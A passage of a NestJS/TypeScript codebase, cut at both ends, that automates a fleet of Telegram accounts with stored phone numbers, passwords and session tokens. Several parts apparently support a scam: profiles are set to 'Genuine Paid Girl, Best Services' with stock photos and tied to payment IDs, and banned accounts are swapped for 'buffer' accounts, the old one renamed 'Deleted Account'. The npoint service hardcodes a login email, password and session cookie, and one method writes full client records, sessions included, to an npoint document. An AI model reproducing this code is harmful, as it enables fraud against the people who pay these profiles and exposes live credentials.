'../Telegram/utils/connection-manager';\n\nlet settingupClient = Date.now() - 250000;\n@Injectable()\nexport class ClientService {\n    private clientsMap: Map<string, Client> = new Map();\n    private lastUpdateMap: Map<string, number> = new Map(); // Track last update times\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ArchivedClientService))\n        private archivedClientService: ArchivedClientService,\n        private npointSerive: NpointService\n    ) {\n        setInterval(async () => {\n            await this.refreshMap();\n        }, 5 * 60 * 1000);\n    }\n\n    async checkNpoint() {\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\n        for (const client in clients) {\n            const existingClient = await this.findOne(client, false);\n            if (areJsonsNotSame(existingClient, clients[client])) {\n                await this.findAll();\n                const clientData = mapToJson(this.clientsMap)\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\n                const maskedCls = {};\n                for (const client in clientData) {\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\n                    maskedCls[client] = maskedClient\n                }\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\n                break;\n            }\n        }\n    }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.clientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const clientMapLength = this.clientsMap.size\n        if (clientMapLength < 20) {\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\n            for (const client of results) {\n                this.clientsMap.set(client.clientId, client)\n            }\n            console.log(\"Refreshed Clients\")\n            return results\n        } else {\n            return Array.from(this.clientsMap.values())\n        }\n    }\n\n    async findAllMasked(query?: SearchClientDto) {\n        const allClients = await this.findAll()\n        const filteredClients = query\n            ? allClients.filter(client => {\n                return Object.keys(query).every(key => client[key] === query[key]);\n            })\n            : allClients;\n        const results = filteredClients.map(client => {\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\n            return maskedClient;\n        });\n        return results;\n    }\n\n    async refreshMap() {\n        console.log(\"Refreshed Clients\")\n        this.clientsMap.clear();\n    }\n\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\n        const client = this.clientsMap.get(clientId)\n        if (client) {\n            return client;\n        } else {\n            const user = await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec();\n            this.clientsMap.set(clientId, user);\n            if (!user && throwErr) {\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n            }\n            return user;\n        }\n    }\n\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto['_id']\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        await fetchWithTimeout(`${notifbot()}&text=Updating the Existing client: ${clientId}`);\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        this.clientsMap.set(clientId, updatedUser);\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\n        console.log(\"Refreshed Maps\")\n        return updatedUser;\n    }\n\n    async remove(clientId: string): Promise<Client> {\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.clientModel.find(filter).exec();\n    }\n\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n        console.log(`Received New Client Request for - ${clientId}`, settingupClient)\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\n            settingupClient = Date.now();\n            const existingClient = await this.findOne(clientId);\n            const existingClientMobile = existingClient.mobile\n            await fetchWithTimeout(`${notifbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\n            console.log(setupClientQueryDto);\n            await connectionManager.disconnectAll();\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n            try {\n                if (newBufferClient) {\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\n                    await connectionManager.getClient(newBufferClient.mobile);\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\n                    await this.updateClientSession(newSession)\n                } else {\n                    await fetchWithTimeout(`${notifbot()}&text=Buffer Clients not available`);\n                    console.log(\"Buffer Clients not available\")\n                }\n\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\n                // if (archivedClient) {\n                //     await fetchWithTimeout(`${notifbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\n                //     await this.updateClientSession(archivedClient.session)\n                // } else {\n                //     await connectionManager.getClientnewBufferClient.mobile, false, true);\n                //     await this.generateNewSession(newBufferClient.mobile)\n                // }\n            } catch (error) {\n                parseError(error);\n                console.log(\"Removing buffer as error\")\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n                this.telegramService.setActiveClientSetup(undefined)\n            } finally {\n                await connectionManager.unregisterClient(newBufferClient.mobile)\n            }\n        } else {\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\n        }\n    }\n\n    async updateClientSession(newSession: string) {\n        try {\n            let updatedUsername = '';\n            console.log(\"Updating Client Session\");\n            const setup = this.telegramService.getActiveClientSetup();\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n            await connectionManager.disconnectAll();\n            await sleep(2000)\n            const client = await this.findOne(clientId);\n            await connectionManager.getClient(newMobile, { handler: true, autoDisconnect: false });\n            const firstName = (client.name).split(' ')[0];\n            const middleName = (client.name).split(' ')[1];\n            const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n            const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n            const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n            try {\n                updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\n            } catch (error) {\n                parseError(error, 'Error in updating username', true);\n            }\n            await fetchWithTimeout(`${notifbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\n            await connectionManager.unregisterClient(newMobile);\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n            const existingClient = await this.findOne(clientId);\n            await this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\n            await this.bufferClientService.remove(newMobile);\n            setTimeout(async () => {\n                await this.updateClient(clientId);\n            }, 15000);\n\n            try {\n                if (existingClientUser) {\n                    try {\n                        if (toBoolean(formalities)) {\n                            await connectionManager.getClient(existingMobile, { handler: true, autoDisconnect: false });\n                            console.log(\"Started Formalities\");\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\n                            await this.telegramService.updateUsername(existingMobile, '');\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\n                            console.log(\"Formalities finished\");\n                            await connectionManager.unregisterClient(existingMobile);\n                            await fetchWithTimeout(`${notifbot()}&text=Formalities finished`);\n                        } else {\n                            console.log(\"Formalities skipped\")\n                        }\n                        if (archiveOld) {\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n                                mobile: existingMobile,\n                                availableDate,\n                                session: existingClientUser.session,\n                                tgId: existingClientUser.tgId,\n                                channels: 170\n                            }\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\n                            // await this.archivedClientService.update(existingMobile, existingClient);\n                            console.log(\"client Archived: \", updatedBufferClient);\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archived`);\n                        } else {\n                            console.log(\"Client Archive Skipped\")\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archive Skipped`);\n                        }\n                    } catch (error) {\n                        console.log(\"Cannot Archive Old Client\");\n                        const errorDetails = parseError(error, 'Error in Archiving Old Client', true);\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\n                            await this.bufferClientService.remove(existingClientUser.mobile);\n                            await this.archivedClientService.remove(existingClientUser.mobile);\n                        } else {\n                            console.log('Not Deleting user');\n                        }\n                    }\n                }\n            } catch (error) {\n                parseError(error, 'Error in Archiving Old Client outer', true);\n                console.log(\"Error in Archiving Old Client\");\n            }\n            this.telegramService.setActiveClientSetup(undefined);\n            console.log(\"Update finished Exitting Exiiting TG Service\");\n            await fetchWithTimeout(`${notifbot()}&text=Update finished`);\n            await connectionManager.disconnectAll();\n        } catch (e) {\n            parseError(e, 'Error in updating client session', true);\n            this.telegramService.setActiveClientSetup(undefined)\n        }\n    }\n\n    async updateClient(clientId: string) {\n        const now = Date.now();\n        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;\n        const cooldownPeriod = 30000;\n        if (now - lastUpdate < cooldownPeriod) {\n            console.log(`Skipping update for ${clientId} - cooldown period not elapsed. Try again in ${Math.ceil((cooldownPeriod - (now - lastUpdate)) / 1000)} seconds`);\n            return;\n        }\n\n        const client = await this.findOne(clientId);\n        try {\n            this.lastUpdateMap.set(clientId, now);\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n            const telegramClient = await connectionManager.getClient(client.mobile, { handler: false });\n            await sleep(2000)\n            const me = await telegramClient.getMe();\n            if (!me.username || me.username !== client.username || !me.username?.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\n                const client = await this.findOne(clientId);\n                const firstName = (client.name).split(' ')[0];\n                const middleName = (client.name).split(' ')[1];\n                const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n                const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n                const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\n                await this.update(client.clientId, { username: updatedUsername })\n            }\n            await sleep(1000)\n            if (me.firstName !== client.name) {\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl, Best Services\");\n            }\n            await sleep(1000)\n            await telegramClient.deleteProfilePhotos();\n            await sleep(1000)\n            await telegramClient.updatePrivacy();\n            await sleep(1000)\n            const rootPath = process.cwd();\n            console.log(rootPath, \"trying to update dp\");\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n        } catch (error) {\n            this.lastUpdateMap.delete(clientId);\n            parseError(error)\n        } finally {\n            connectionManager.unregisterClient(client.mobile);\n        }\n    }\n\n    async updateClients() {\n        const clients = await this.findAll();\n        for (const client of clients) {\n            await this.updateClient(client.clientId)\n        }\n    }\n\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\n        try {\n            console.log(\"String Generation started\");\n            await fetchWithTimeout(`${notifbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\n            await sleep(1000);\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\n            if (response) {\n                console.log(`Code Sent successfully`, response.data);\n                await fetchWithTimeout(`${notifbot()}&text=Code Sent successfully`);\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=Failed to send Code`);\n                console.log(\"Failed to send Code\", response);\n                if (attempt < 2) {\n                    await sleep(8000);\n                    await this.generateNewSession(phoneNumber, attempt + 1);\n                }\n            }\n        } catch (error) {\n            console.log(error);\n            if (attempt < 2) {\n                await sleep(8000);\n                await this.generateNewSession(phoneNumber, attempt + 1);\n            }\n        }\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.clientModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\n            { new: true } // Return the updated document\n        ).exec();\n    }\n\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\n            { new: true } // Return the updated document\n        ).exec();\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\n    readonly promoteMobile: string[];\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user', required: false })\n    readonly qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user', required: false })\n    readonly gpayId: string;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\n\nexport class SearchClientDto {\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\n    clientId?: string;\n\n    @ApiPropertyOptional({ description: 'Database collection name' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    dbcoll?: string;\n\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    channelLink?: string;\n\n    @ApiPropertyOptional({ description: 'Link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    link?: string;\n\n    @ApiPropertyOptional({ description: 'Name of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    name?: string;\n\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\n    number?: string;\n\n    @ApiPropertyOptional({ description: 'Password of the client' })\n    @IsOptional()\n    @IsString()\n    password?: string;\n\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    repl?: string;\n\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    promoteRepl?: string;\n\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    clientName?: string;\n\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    deployKey?: string;\n\n    @ApiPropertyOptional({ description: 'Main account of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    mainAccount?: string;\n\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    product?: string;\n\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\n    @IsOptional()\n    @IsArray()\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\n    promoteMobile?: string[];\n\n    @ApiPropertyOptional({ description: 'Paytm QR ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    qrId?: string;\n\n    @ApiPropertyOptional({ description: 'Google Pay ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    gpayId?: string;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateClientDto } from './create-client.dto';\n\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\n    @Prop({ required: true, type: [String] })\n    promoteMobile: string[];\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' })\n    @Prop({ required: true })\n    qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' })\n    @Prop({ required: true })\n    gpayId: string;\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","import {\n    Controller,\n    Get,\n    Post,\n    Put,\n    Param,\n    Body,\n    HttpException,\n    HttpStatus,\n  } from '@nestjs/common';\n  import { NpointService } from './npoint.service';\n  import {\n    ApiTags,\n    ApiOperation,\n    ApiParam,\n    ApiBody,\n    ApiResponse,\n  } from '@nestjs/swagger';\n  \n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\n  @Controller('npoint')\n  export class NpointController {\n    constructor(private readonly npointService: NpointService) {}\n  \n    @Get('documents/:id')\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\n    @ApiResponse({\n      status: 200,\n      description: 'Document fetched successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async fetchDocument(@Param('id') id: string) {\n      try {\n        return await this.npointService.fetchDocument(id);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  \n    @Post('documents')\n    @ApiOperation({ summary: 'Post a new document' })\n    @ApiBody({\n      description: 'The document to post',\n      schema: {\n        example: {\n          title: 'My Document',\n          content: 'This is the content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 201,\n      description: 'Document posted successfully',\n    })\n    @ApiResponse({ status: 400, description: 'Invalid input' })\n    async postDocument(@Body() document: any) {\n      try {\n        return await this.npointService.postDocument(document);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n      }\n    }\n\n    @Get('documents')\n    @ApiOperation({ summary: 'Fetch all documents' })\n    @ApiResponse({\n      status: 200,\n      description: 'List of all documents fetched successfully',\n    })\n    @ApiResponse({ status: 500, description: 'Internal server error' })\n    async fetchAllDocuments() {\n      try {\n        return await this.npointService.fetchAllDocuments();\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n      }\n    }  \n  \n    @Put('documents/:id')\n    @ApiOperation({ summary: 'Update a document by ID' })\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\n    @ApiBody({\n      description: 'The updated document',\n      schema: {\n        example: {\n          title: 'Updated Document',\n          content: 'This is the updated content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 200,\n      description: 'Document updated successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\n      try {\n        return await this.npointService.updateDocument(id, updatedDocument);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  }","import { Module } from '@nestjs/common';\nimport { NpointService } from './npoint.service';\nimport { NpointController } from './npoint.controller';\n\n@Module({\n  controllers: [NpointController],\n  providers: [NpointService],\n  exports: [NpointService]\n})\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\nimport axios from 'axios';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            let data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            let config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // 